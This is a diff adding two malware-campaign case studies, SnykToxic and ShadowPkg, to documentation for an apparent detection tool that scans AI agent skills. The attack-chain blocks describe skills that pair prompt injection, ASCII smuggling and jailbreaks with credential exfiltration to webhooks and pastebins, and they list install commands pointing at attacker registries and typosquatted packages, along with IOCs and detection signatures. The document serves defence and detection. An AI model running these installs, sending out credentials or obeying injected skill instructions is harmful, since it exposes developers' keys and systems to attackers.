@@ -208,6 +208,215 @@ VALUES (
 
 ---
 
+## Case Study: The SnykToxic Campaign
+
+### Background
+
+SnykToxic is a data exfiltration campaign discovered through Snyk's ToxicSkills research, the first comprehensive security audit of the AI agent skills ecosystem. The research scanned 3,984 skills from ClawHub and skills.sh, finding 76 confirmed malicious payloads. SnykToxic skills exfiltrate host information, environment variables, and credentials via Vercel deployments and Google Apps Script webhooks, combining prompt injection with traditional malware in 91% of samples to bypass both AI safety mechanisms and conventional security tooling.
+
+### Threat Actor Profile
+
+| Attribute | Details |
+|---|---|
+| **Campaign Name** | SnykToxic |
+| **First Seen** | 2026-01-20 |
+| **Last Seen** | 2026-02-15 |
+| **Status** | Active |
+| **Exfiltration Method** | Vercel deployments, Google Apps Script webhooks, pastebin services |
+| **Primary Target** | Developer credentials, AWS keys, environment variables, host info |
+| **Affected Skills** | 76 confirmed |
+
+### Known Threat Actors
+
+| Handle | Role |
+|---|---|
+| aztr0nutzs | Primary operator, maintains NET_NiNjA repository with ready-to-deploy malicious skills |
+| denboss99 | Repository operator, hosted trojanized openclaw-core payload archives |
+
+### Attack Chain
+
+The SnykToxic attack chain exploits the trust relationship between agents and their skill libraries:
+
+```
+1. PUBLISH: Attacker publishes a skill on ClawHub
+   - Skill appears to be a legitimate developer tool (e.g., "Vercel Deploy Helper")
+   - Uses ASCII smuggling to hide malicious instructions
+   - Combines prompt injection with traditional malware
+
+2. PREREQUISITES: Skill directs user to install "openclaw-core"
+   - Links to rentry.co/openclaw-core pastebin stager
+   - Or GitHub releases from denboss99/openclaw-core
+   - Archive is password-protected (e.g., "infected123")
+
+3. EXFILTRATE VIA GOOGLE APPS SCRIPT: Embedded commands exfiltrate data
+   - uname -a piped to script.google.com/macros/s/.../exec
+   - AWS credentials base64-encoded and sent to pastebin.com
+   - Environment variables harvested and posted to attacker webhook
+
+4. EXFILTRATE VIA VERCEL: Alternative exfiltration channel
+   - Data sent to attacker-controlled Vercel deployments
+   - Hostname and system info collected silently
+   - Credentials forwarded to remote pastebin endpoints
+
+5. PERSIST: Malicious skill may install additional payloads
+   - Service files modified for persistent backdoor access
+   - Agent safety mechanisms bypassed via DAN-style jailbreaks
+```
+
+### Indicators of Compromise (IOCs)
+
+#### Network IOCs
+
+| IOC Type | Value | Description |
+|---|---|---|
+| GitHub Repo | `aztr0nutzs/NET_NiNjA.v1.2` | Repository hosting ready-to-deploy malicious MCP skills |
+| URL | `rentry.co/openclaw-core` | Pastebin stager for fake openclaw-core distribution |
+| URL Pattern | `script.google.com/macros/s/*/exec` | Google Apps Script endpoints for credential exfiltration |
+| GitHub Repo | `denboss99/openclaw-core` | Trojanized openclaw-core payload archive distribution |
+
+#### Publisher IOCs
+
+| Handle | Role |
+|---|---|
+| aztr0nutzs | Malicious skill publisher and NET_NiNjA maintainer |
+| denboss99 | Payload archive distributor |
+
+### malwar Detection Coverage
+
+| Layer | Detection | Rule/Mechanism |
+|---|---|---|
+| Layer 1 | Piped execution | MALWAR-CMD-001 |
+| Layer 1 | Credential harvesting | MALWAR-EXFIL-001 |
+| Layer 1 | Environment variable exfiltration | MALWAR-EXFIL-003 |
+| Layer 1 | Password archive extraction | MALWAR-CMD-003 |
+| Layer 2 | Pastebin URL | Domain reputation scoring |
+| Layer 3 | Deceptive intent with exfiltration | LLM semantic analysis |
+| Layer 4 | Signature correlation | sig-snyktoxic-github-repo, sig-snyktoxic-rentry-stager, sig-snyktoxic-gas-exfil, sig-snyktoxic-github-releases |
+
+### Seed Data
+
+**Signature records:**
+
+| Signature ID | Name | Pattern Value | IOC Type |
+|---|---|---|---|
+| sig-snyktoxic-github-repo | SnykToxic GitHub Repo | aztr0nutzs/NET_NiNjA.v1.2 | url |
+| sig-snyktoxic-rentry-stager | SnykToxic Rentry Stager | rentry.co/openclaw-core | url |
+| sig-snyktoxic-gas-exfil | SnykToxic Google Apps Script Exfil | script\.google\.com/macros/s/[A-Za-z0-9_-]+/exec (regex) | url |
+| sig-snyktoxic-github-releases | SnykToxic Fake OpenClaw Core | denboss99/openclaw-core | url |
+
+### References
+
+- [Snyk ToxicSkills Research: Malicious AI Agent Skills](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/)
+- [How a Malicious Google Skill on ClawHub Tricks Users Into Installing Malware](https://snyk.io/blog/clawhub-malicious-google-skill-openclaw-malware/)
+- [snyk-labs/toxicskills-goof (educational examples)](https://github.com/snyk-labs/toxicskills-goof)
+
+---
+
+## Case Study: The ShadowPkg Campaign
+
+### Background
+
+ShadowPkg is a supply chain campaign that distributes trojanized npm and pip packages through the prerequisites sections of agent skills. Rather than embedding malware directly in the skill, ShadowPkg skills instruct users or agents to install typosquatted packages or pull from attacker-controlled registries. The packages contain post-install hooks that harvest environment variables, SSH keys, and cloud credentials. This campaign exploits the trust users place in skill-recommended dependencies.
+
+### Threat Actor Profile
+
+| Attribute | Details |
+|---|---|
+| **Campaign Name** | ShadowPkg |
+| **First Seen** | 2026-01-28 |
+| **Last Seen** | 2026-02-18 |
+| **Status** | Active |
+| **Attack Vector** | Typosquatted packages, malicious registries |
+| **Primary Target** | Developer workstations, CI/CD environments |
+| **Affected Skills** | 42 confirmed |
+
+### Known Threat Actors
+
+| Handle | Role |
+|---|---|
+| ScaffoldPro | Primary operator, publishes scaffolding/setup skills with trojanized dependencies |
+
+### Attack Chain
+
+The ShadowPkg attack chain leverages dependency confusion and typosquatting:
+
+```
+1. PUBLISH: Attacker publishes a skill on ClawHub
+   - Skill appears to be a legitimate scaffolding or setup tool
+   - Uses popular keywords (scaffolding, setup, dependencies, full-stack)
+   - Author presents as a helpful community contributor
+
+2. PREREQUISITES: Skill lists trojanized packages
+   - pip install colourfool (typosquat of colorful)
+   - npm install crossenv (typosquat of cross-env)
+   - pip install python3-dateutil (typosquat of python-dateutil)
+   - npm install lodash-utils (typosquat of lodash)
+
+3. REGISTRY POISONING: Skill directs to malicious registries
+   - pip install --index-url http://evil-registry.example.com/simple/
+   - pip install --trusted-host evil-mirror.example.com
+   - npm install git+https://github.com/attacker/malicious-lib.git
+
+4. POST-INSTALL HOOKS: Trojanized packages execute on install
+   - Harvest environment variables (AWS_*, GITHUB_TOKEN, etc.)
+   - Read SSH keys from ~/.ssh/
+   - Collect cloud credential files
+   - Exfiltrate to attacker-controlled endpoints
+
+5. PERSIST: Packages may install persistent access
+   - Modify shell profiles to re-harvest on login
+   - Install additional malicious packages as dependencies
+```
+
+### Indicators of Compromise (IOCs)
+
+#### Package IOCs
+
+| IOC Type | Value | Description |
+|---|---|---|
+| Package | `crossenv` | Typosquat of `cross-env`, npm credential harvester |
+| Package | `colourfool` | Typosquat of `colorful`, pip environment variable exfiltrator |
+| Package | `python3-dateutil` | Typosquat of `python-dateutil`, pip credential stealer |
+| Package | `babelcli` | Typosquat of `babel-cli`, npm backdoor installer |
+| Package | `lodash-utils` | Typosquat of `lodash`, npm environment harvester |
+
+#### Infrastructure IOCs
+
+| IOC Type | Value | Description |
+|---|---|---|
+| Domain | `evil-registry.example.com` | Attacker-controlled pip registry for trojanized packages |
+| Domain | `evil-mirror.example.com` | Attacker-controlled pip mirror for trojanized packages |
+
+#### Publisher IOCs
+
+| Handle | Role |
+|---|---|
+| ScaffoldPro | Malicious skill publisher distributing trojanized dependency lists |
+
+### malwar Detection Coverage
+
+| Layer | Detection | Rule/Mechanism |
+|---|---|---|
+| Layer 1 | Typosquatted packages | MALWAR-SUPPLY-001 |
+| Layer 1 | Suspicious registry URLs | MALWAR-SUPPLY-002 |
+| Layer 1 | Git-based package installs | MALWAR-CMD-002 |
+| Layer 2 | Malicious registry domain | Domain reputation scoring |
+| Layer 3 | Deceptive dependency intent | LLM semantic analysis |
+| Layer 4 | Signature correlation | sig-shadowpkg-crossenv, sig-shadowpkg-colourfool, sig-shadowpkg-evil-registry, sig-shadowpkg-evil-mirror |
+
+### Seed Data
+
+**Signature records:**
+
+| Signature ID | Name | Pattern Value | IOC Type |
+|---|---|---|---|
+| sig-shadowpkg-crossenv | ShadowPkg Typosquat crossenv | crossenv | hash |
+| sig-shadowpkg-colourfool | ShadowPkg Typosquat colourfool | colourfool | hash |
+| sig-shadowpkg-evil-registry | ShadowPkg Malicious Registry | evil-registry.example.com | domain |
+| sig-shadowpkg-evil-mirror | ShadowPkg Malicious Mirror | evil-mirror.example.com | domain |
+
+---
+
 ## Adding New Campaigns
 
 ### Step 1: Define the Campaign
